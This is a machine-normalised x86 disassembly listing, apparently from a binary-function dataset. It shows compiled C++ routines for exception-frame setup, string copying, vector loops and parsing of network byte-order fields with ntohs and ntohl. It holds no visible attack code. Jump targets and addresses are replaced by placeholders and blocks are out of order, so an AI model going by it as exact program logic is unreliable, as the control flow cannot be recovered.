je r-xdata
call sub_1003c58d
imul eax eax 0x68
push eax
call sub_1003cdeb
add esp 0x4
mov edi eax
mov [ ebp - 0x14 ] edi
test edi edi
jne r-xdata
push [ ebx ]
call j_sub_1003f3e3#2
add esp 0x4
mov ecx esi
call sub_10014980
add esi 0x68
cmp esi [ ebp - 0x14 ]
jne r-xdata
sub_1002d7b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b941
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
call sub_10004f60
sub_1002d810
push ebp
mov ebp esp
push 0xffffffff
push sub_10051744
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov [ ebp - 0x10 ] edi
mov esi [ ebp + 0x8 ]
push 0xffffffff
push 0x0
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
push esi
mov [ edi ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x0
lea ecx [ edi + 0x18 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
push 0xffffffff
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] ax
lea eax [ esi + 0x18 ]
push eax
call sub_10003a20
mov [ ebp - 0x4 ] 0x1
lea ecx [ edi + 0x38 ]
mov eax [ esi + 0x30 ]
mov [ edi + 0x30 ] eax
mov eax [ esi + 0x34 ]
mov [ edi + 0x34 ] eax
lea eax [ esi + 0x38 ]
push 0xffffffff
push 0x0
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push eax
mov [ ecx ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x2
lea eax [ esi + 0x50 ]
push eax
lea ecx [ edi + 0x50 ]
call sub_100048b0
mov [ ebp - 0x4 ] 0x3
lea eax [ esi + 0x5c ]
push eax
lea ecx [ edi + 0x5c ]
call sub_100048b0
mov [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1002d8f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10051760
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx edx
mov esi ecx
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
lea esp [ esp ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
push edi
call sub_1002d7b0
add edi 0x18
mov [ ebp + 0x8 ] edi
add esi 0x18
mov [ ebp - 0x18 ] esi
jmp r-xdata
cmp esi ebx
je r-xdata
sub_1002d964
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_1003e35b
int3
mov edi edi
push esi
call sub_10004c90
add esi 0x18
cmp esi edi
jne r-xdata
sub_1002d990
push ebp
mov ebp esp
push 0xffffffff
push sub_10051780
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx edx
mov esi ecx
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x4 ] 0x0
lea esp [ esp ]
mov [ ebp - 0x4 ] 0xffffffff
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push esi
push edi
call sub_1002da30
add edi 0x68
mov [ ebp + 0x8 ] edi
add esi 0x68
mov [ ebp - 0x18 ] esi
jmp r-xdata
cmp esi ebx
je r-xdata
sub_1002da04
mov esi [ ebp - 0x14 ]
mov edi [ ebp + 0x8 ]
cmp esi edi
je r-xdata
push 0x0
push 0x0
call sub_1003e35b
int3
mov edi edi
mov ecx esi
call sub_10014980
add esi 0x68
cmp esi edi
jne r-xdata
sub_1002da30
push ebp
mov ebp esp
push 0xffffffff
push sub_1004b941
mov eax [ fs : 0x0 ]
push eax
push ecx
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] 0x0
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x8
push [ ebp + 0xc ]
call sub_1002d810
sub_1002da90
push ebp
mov ebp esp
push 0xffffffff
push sub_100517b0
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov [ ebp - 0x4 ] 0x1
lea eax [ ebp + 0x8 ]
cmp esi eax
je r-xdata
mov eax [ ebp + 0x20 ]
mov [ esi + 0x18 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov [ ebp + 0x1c ] 0xf
mov eax esi
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x1c
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1002db30
push ebp
mov ebp esp
push 0xffffffff
push sub_100517e0
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
lea esi [ ecx + 0x4 ]
lea eax [ ebp + 0x8 ]
cmp esi eax
je r-xdata
mov eax [ ebp + 0x20 ]
mov [ esi + 0x18 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_100018b0
mov [ ebp + 0x1c ] 0xf
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x1c
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1002dbc0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004c3b8
mov eax [ fs : 0x0 ]
push eax
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x4 ] 0x0
add ecx 0x4
lea eax [ ebp + 0x8 ]
cmp ecx eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
mov [ ebp + 0x1c ] 0xf
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
mov esp ebp
pop ebp
retn 0x18
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1002dc40
push ebp
mov ebp esp
push 0xffffffff
push sub_10051830
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x18 ] 0x8
jb r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
cmp [ ebp + 0x1c ] 0x10
lea eax [ ebp + 0x8 ]
mov esi [ ntohl@IAT ]
cmovae eax [ ebp + 0x8 ]
push [ eax ]
call esi
push 0x4
push 0x0
lea ecx [ ebp + 0x8 ]
mov edi eax
call sub_10001ae0
cmp [ ebp + 0x1c ] 0x10
lea ecx [ ebp + 0x8 ]
cmovae ecx [ ebp + 0x8 ]
push [ ecx ]
call esi
push 0x4
push 0x0
lea ecx [ ebp + 0x8 ]
mov esi eax
call sub_10001ae0
cmp [ ebp + 0x18 ] esi
jne r-xdata
mov [ ebp + 0x1c ] 0xf
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
cmp [ ebp + 0x1c ] 0x10
lea edx [ ebp + 0x8 ]
push edi
cmovae edx [ ebp + 0x8 ]
sub esp 0x18
mov ecx esp
mov [ ebp - 0x30 ] esp
push esi
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] 0x0
push edx
mov [ ecx ] 0x0
call sub_100019e0
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_1002da90
mov edi eax
mov [ ebp - 0x4 ] 0x2
sub esp 0x1c
mov esi esp
mov [ ebp - 0x30 ] esp
mov ecx esi
mov [ ebp - 0x34 ] esi
push 0xffffffff
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push edi
mov [ esi ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x3
mov eax [ edi + 0x18 ]
mov [ esi + 0x18 ] eax
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x4 ] 0x2
mov ecx ebx
call sub_1002db30
mov [ ebp - 0x4 ] 0x0
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
push [ ebp - 0x2c ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1002ddc0
push ebp
mov ebp esp
push 0xffffffff
push sub_10051868
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x18 ] 0x6
jb r-xdata
mov [ ebx + 0x2c ] 0x8
mov [ ebx + 0x30 ] 0xd
cmp [ ebp + 0x1c ] 0x10
lea edi [ ebp + 0x8 ]
mov esi [ ntohs@IAT ]
cmovae edi [ ebp + 0x8 ]
movzx eax [ edi ]
push eax
call esi
movzx eax ax
mov [ ebx + 0x2c ] eax
movzx eax [ edi + 0x2 ]
push eax
call esi
movzx eax ax
mov [ ebx + 0x30 ] eax
movzx eax [ edi + 0x2 ]
push eax
call esi
movzx eax ax
mov [ ebx + 0x34 ] eax
jmp r-xdata
mov [ ebp + 0x1c ] 0xf
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
sub_1002de80
push ebp
mov ebp esp
push 0xffffffff
push sub_100518a8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x4 ] 0x0
xor ebx ebx
mov [ ebp - 0x34 ] ebx
mov edi 0x3
mov esi 0xcb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] ebx
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x18 ] 0x2
jb r-xdata
lea eax [ ebp - 0x34 ]
movzx esi si
push eax
lea ecx [ ebp - 0x20 ]
call sub_1002fb60
mov [ ebp - 0x4 ] 0x2
mov ecx [ ebp - 0x38 ]
movzx eax di
mov [ ecx + 0x44 ] eax
lea eax [ ebp - 0x20 ]
mov [ ecx + 0x48 ] esi
add ecx 0x38
push eax
call sub_1002fc10
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x20 ]
test eax eax
je r-xdata
cmp [ ebp + 0x1c ] 0x10
lea eax [ ebp + 0x8 ]
mov ebx [ ntohs@IAT ]
cmovae eax [ ebp + 0x8 ]
movzx eax [ eax ]
push eax
call ebx
push 0x2
movzx eax ax
lea ecx [ ebp + 0x8 ]
push 0x0
mov [ ebp - 0x24 ] eax
call sub_10001ae0
cmp [ ebp + 0x18 ] 0x2
jb r-xdata
mov [ ebp - 0x4 ] 0x0
test ebx ebx
je r-xdata
push eax
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x20 ] 0x0
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x18 ] 0x0
mov edi [ ebp - 0x24 ]
mov ebx [ ebp - 0x34 ]
cmp [ ebp + 0x1c ] 0x10
lea eax [ ebp + 0x8 ]
cmovae eax [ ebp + 0x8 ]
movzx eax [ eax ]
push eax
call ebx
push 0x2
movzx eax ax
lea ecx [ ebp + 0x8 ]
push 0x0
mov [ ebp - 0x28 ] eax
call sub_10001ae0
cmp [ ebp + 0x18 ] 0x2
jb r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x1c ] 0x10
jb r-xdata
push ebx
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp - 0x34 ] 0x0
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x2c ] 0x0
mov esi [ ebp - 0x28 ]
cmp [ ebp + 0x1c ] 0x10
lea eax [ ebp + 0x8 ]
cmovae eax [ ebp + 0x8 ]
movzx eax [ eax ]
push eax
call ebx
push 0x2
push 0x0
lea ecx [ ebp + 0x8 ]
movzx edi ax
call sub_10001ae0
test edi edi
je r-xdata
mov [ ebp + 0x1c ] 0xf
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x8 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
push [ ebp + 0x8 ]
call j_sub_1003f3e3#2
add esp 0x4
lea esp [ esp ]
dec edi
jne r-xdata
cmp [ ebp + 0x1c ] 0x10
lea esi [ ebp + 0x8 ]
cmovae esi [ ebp + 0x8 ]
movzx eax [ esi ]
push eax
call ebx
movzx eax ax
mov [ ebp - 0x20 ] eax
movzx eax [ esi + 0x2 ]
push eax
call ebx
movzx eax ax
mov [ ebp - 0x18 ] eax
movzx eax [ esi + 0x4 ]
push eax
call ebx
movzx eax ax
mov [ ebp - 0x1c ] eax
movzx eax [ esi + 0x6 ]
push eax
call ebx
push 0x8
movzx eax ax
lea ecx [ ebp + 0x8 ]
push 0x0
mov [ ebp - 0x14 ] eax
call sub_10001ae0
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x34 ]
call sub_1002fd50
cmp [ ebp + 0x18 ] 0x8
jb r-xdata
sub_1002e090
push esi
mov esi ecx
push edi
mov edi edx
cmp [ esi + 0x10 ] 0x2
jae r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
pop edi
xor eax eax
pop esi
retn
mov eax esi
mov eax [ esi ]
jmp r-xdata
movzx eax [ eax ]
push eax
call [ ntohs@IAT ]
push 0x2
push 0x0
mov ecx esi
mov [ edi ] ax
call sub_10001ae0
pop edi
mov eax 0x1
pop esi
retn
sub_1002e0d0
push ebp
mov ebp esp
push 0xffffffff
push sub_100518d8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx edx
mov edi ecx
cmp [ edi + 0x10 ] 0x2
jae r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
xor eax eax
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
push esi
push 0x0
lea eax [ ebp - 0x28 ]
mov ecx edi
push eax
call sub_10006fa0
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x4 ] 0x0
cmp ebx eax
je r-xdata
movzx eax [ eax ]
push eax
call [ ntohs@IAT ]
push 0x2
push 0x0
mov ecx edi
movzx esi ax
call sub_10001ae0
cmp [ edi + 0x10 ] esi
jb r-xdata
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x14 ] 0x10
jb r-xdata
cmp [ ebx + 0x14 ] 0x10
jb r-xdata
push esi
push 0x0
mov ecx edi
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
call sub_10001ae0
mov eax 0x1
push [ ebp - 0x28 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebx + 0x14 ] 0xf
mov ecx ebx
mov [ ebx + 0x10 ] 0x0
push eax
mov [ ebx ] 0x0
call sub_10005010
push [ ebx ]
call j_sub_1003f3e3#2
mov eax [ ebp - 0x2c ]
add esp 0x4
sub_1002e1e0
push ebp
mov ebp esp
push 0xffffffff
push sub_10051a45
mov eax [ fs : 0x0 ]
push eax
sub esp 0x74
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi edx
mov [ ebp - 0x7c ] esi
mov [ ebp - 0x80 ] ecx
mov [ ebp - 0x4 ] 0x3
lea ebx [ ebx ]
mov dl [ esi + 0x1 ]
test dl dl
je r-xdata
cmp dl 0xff
jae r-xdata
mov dl [ esi + 0x2 ]
test dl dl
je r-xdata
cmp dl cl
jae r-xdata
xor eax eax
mov cl dl
mov dl [ esi + 0x3 ]
test dl dl
je r-xdata
cmp dl cl
jae r-xdata
mov eax 0x1
mov cl dl
mov dl [ esi + 0x4 ]
test dl dl
je r-xdata
cmp dl cl
jae r-xdata
mov eax 0x2
mov cl dl
mov dl [ esi + 0x5 ]
test dl dl
je r-xdata
cmp dl cl
jae r-xdata
mov eax 0x3
mov cl dl
mov dl [ esi + 0x6 ]
test dl dl
je r-xdata
cmp dl cl
jae r-xdata
mov eax 0x4
mov cl dl
cmp cl 0xff
je r-xdata
cmp dl cl
jae r-xdata
mov eax 0x5
mov cl dl
mov [ ebp - 0x4 ] 0x2
cmp [ ebp + 0x34 ] 0x10
jb r-xdata
xor ebx ebx
mov [ ebp - 0x44 ] ebx
mov [ esi + eax ] bl
test eax eax
jne r-xdata
mov eax 0x6
mov cl dl
mov [ ebp + 0x34 ] 0xf
mov [ ebp + 0x30 ] 0x0
mov [ ebp + 0x20 ] 0x0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x4c ] 0x10
jb r-xdata
push [ ebp + 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
cmp eax 0x1
jne r-xdata
push 0x5c
call sub_1003cdeb
mov ebx eax
mov [ ebp - 0x44 ] eax
add esp 0x4
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x4 ] 0x4
test ebx ebx
je r-xdata
mov [ ebp + 0x4c ] 0xf
mov [ ebp + 0x48 ] 0x0
mov [ ebp + 0x38 ] 0x0
mov [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
push [ ebp + 0x38 ]
call j_sub_1003f3e3#2
add esp 0x4
cmp eax 0x2
jne r-xdata
push 0x60
call sub_1003cdeb
mov ebx eax
mov [ ebp - 0x44 ] eax
add esp 0x4
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x4 ] 0x6
test ebx ebx
je r-xdata
xor ebx ebx
mov [ ebp - 0x44 ] ebx
mov ecx ebx
call sub_10004330
mov [ ebp - 0x4 ] 0x5
mov [ ebx ] r--data
mov [ ebx + 0x58 ] 0x1
mov [ ebp - 0x4 ] 0x4
jmp r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov esi [ ebp + 0x14 ]
test esi esi
je r-xdata
mov edi [ ebp + 0xc ]
cmp esi edi
je r-xdata
cmp eax 0x3
jne r-xdata
push 0x60
call sub_1003cdeb
mov ebx eax
mov [ ebp - 0x44 ] eax
add esp 0x4
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x4 ] 0x8
test ebx ebx
je r-xdata
mov ecx ebx
call sub_10004330
mov [ ebp - 0x4 ] 0x7
mov [ ebx ] r--data
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x5c ] 0x1
mov [ ebp - 0x4 ] 0x6
jmp r-xdata
mov dl [ esi ]
or cl 0xff
mov eax 0x7
test dl dl
je r-xdata
push 0xffffffff
push 0x0
lea eax [ ebp + 0x20 ]
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x64 ] 0x0
lea ecx [ ebp - 0x78 ]
push eax
mov [ ebp - 0x64 ] 0xf
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x78 ] 0x0
call sub_100018b0
mov [ ebp - 0x4 ] 0x12
lea ecx [ ebx + 0x4 ]
lea eax [ ebp - 0x78 ]
cmp ecx eax
je r-xdata
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
mov edi [ ebp + 0x18 ]
cmp esi edi
je r-xdata
push esi
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp + 0x8 ] 0x0
mov [ ebp + 0xc ] 0x0
mov [ ebp + 0x10 ] 0x0
cmp [ esi + 0x14 ] 0x10
jb r-xdata
cmp eax 0x4
jne r-xdata
push 0x5c
call sub_1003cdeb
mov ebx eax
mov [ ebp - 0x44 ] eax
add esp 0x4
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x4 ] 0xa
test ebx ebx
je r-xdata
mov ecx ebx
call sub_10004330
mov [ ebp - 0x4 ] 0x9
mov [ ebx ] r--data
mov [ ebx + 0x58 ] 0x1
mov [ ebx + 0x5c ] 0x2
mov [ ebp - 0x4 ] 0x8
jmp r-xdata
mov [ ebp - 0x4 ] 0x3
cmp [ ebp - 0x64 ] 0x10
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_100018b0
push esi
call j_sub_1003f3e3#2
add esp 0x4
mov [ ebp + 0x14 ] 0x0
mov [ ebp + 0x18 ] 0x0
mov [ ebp + 0x1c ] 0x0
mov edi edi
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
add esi 0x18
cmp esi edi
jne r-xdata
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
cmp eax 0x5
jne r-xdata
push 0x60
call sub_1003cdeb
mov ebx eax
mov [ ebp - 0x44 ] eax
add esp 0x4
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x4 ] 0xc
test ebx ebx
je r-xdata
mov ecx ebx
call sub_10004330
mov [ ebp - 0x4 ] 0xb
mov [ ebx ] r--data
mov [ ebx + 0x58 ] 0x0
mov [ ebp - 0x4 ] 0xa
jmp r-xdata
cmp [ ebp + 0x4c ] 0x10
lea edx [ ebp + 0x38 ]
mov [ ebp - 0x64 ] 0xf
cmovae edx [ ebp + 0x38 ]
mov [ ebp - 0x68 ] 0x0
mov [ ebp - 0x78 ] 0x0
cmp [ edx ] 0x0
jne r-xdata
push [ ebp - 0x78 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
add esi 0x18
cmp esi edi
jne r-xdata
push [ esi ]
call j_sub_1003f3e3#2
add esp 0x4
mov esi [ ebp + 0x8 ]
cmp eax 0x6
jne r-xdata
push 0x60
call sub_1003cdeb
mov ebx eax
mov [ ebp - 0x44 ] eax
add esp 0x4
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x4 ] 0xe
test ebx ebx
je r-xdata
mov ecx ebx
call sub_10004330
mov [ ebp - 0x4 ] 0xd
mov [ ebx ] r--data
mov [ ebx + 0x58 ] 0x0
mov [ ebx + 0x5c ] 0x1
mov [ ebp - 0x4 ] 0xc
jmp r-xdata
mov ecx edx
lea esi [ ecx + 0x1 ]
lea esp [ esp ]
xor ecx ecx
jmp r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov esi [ ebp + 0x14 ]
test ebx ebx
je r-xdata
push 0x58
call sub_1003cdeb
mov ebx eax
mov [ ebp - 0x44 ] eax
add esp 0x4
mov [ ebp - 0x48 ] ebx
mov [ ebp - 0x4 ] 0x10
test ebx ebx
je r-xdata
mov ecx ebx
call sub_10004330
mov [ ebp - 0x4 ] 0xf
mov [ ebx ] r--data
mov [ ebx + 0x58 ] 0x0
mov [ ebx + 0x5c ] 0x2
mov [ ebp - 0x4 ] 0xe
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx esi
push ecx
push edx
lea ecx [ ebx + 0x1c ]
call sub_100019e0
mov esi [ ebp + 0x8 ]
xor ecx ecx
mov [ ebp - 0x4c ] ecx
mov eax 0x2aaaaaab
mov ecx [ ebp + 0xc ]
sub ecx esi
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
je r-xdata
mov ecx ebx
call sub_10004330
mov [ ebp - 0x4 ] 0x11
mov [ ebx ] r--data
mov [ ebp - 0x4 ] 0x10
jmp r-xdata
mov esi [ ebp + 0x14 ]
xor ecx ecx
mov [ ebp - 0x4c ] ecx
mov eax 0x2aaaaaab
mov ecx [ ebp + 0x18 ]
sub ecx esi
imul ecx
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
je r-xdata
lea edi [ ebx + 0x34 ]
xor ebx ebx
mov [ ebp - 0x48 ] ebx
nop
mov eax [ ebp - 0x44 ]
mov ecx [ ebp - 0x80 ]
mov [ ebp - 0x48 ] eax
add ecx 0x20
lea eax [ ebp - 0x48 ]
push eax
call sub_100038e0
mov esi [ ebp - 0x7c ]
jmp r-xdata
lea edi [ ebx + 0x40 ]
xor ebx ebx
mov [ ebp - 0x48 ] ebx
cmp [ edx ] 0x0
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x2c ] 0xf
mov [ ebp - 0x30 ] 0x0
mov [ ebp - 0x40 ] 0x0
jne r-xdata
mov edx [ edx ]
cmp [ edx ] 0x0
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x14 ] 0x0
mov [ ebp - 0x14 ] 0xf
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x28 ] 0x0
jne r-xdata
mov edx [ edx ]
mov ecx edx
lea esi [ ecx + 0x1 ]
lea ebx [ ebx ]
xor ecx ecx
jmp r-xdata
mov eax edx
lea esi [ eax + 0x1 ]
lea esp [ esp ]
xor eax eax
jmp r-xdata
mov al [ ecx ]
inc ecx
test al al
jne r-xdata
sub ecx esi
push ecx
push edx
lea ecx [ ebp - 0x40 ]
call sub_100019e0
mov [ ebp - 0x4 ] 0x13
lea eax [ ebp - 0x40 ]
mov esi [ edi + 0x4 ]
cmp eax esi
jae r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
push eax
push edx
lea ecx [ ebp - 0x28 ]
call sub_100019e0
mov [ ebp - 0x4 ] 0x18
lea eax [ ebp - 0x28 ]
mov esi [ edi + 0x4 ]
cmp eax esi
jae r-xdata
cmp esi [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
lea ecx [ ebp - 0x40 ]
cmp eax ecx
ja r-xdata
cmp esi [ edi + 0x8 ]
jne r-xdata
mov eax [ edi ]
lea ecx [ ebp - 0x28 ]
cmp eax ecx
ja r-xdata
mov esi [ edi + 0x4 ]
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x5c ] esi
mov [ ebp - 0x4 ] 0x16
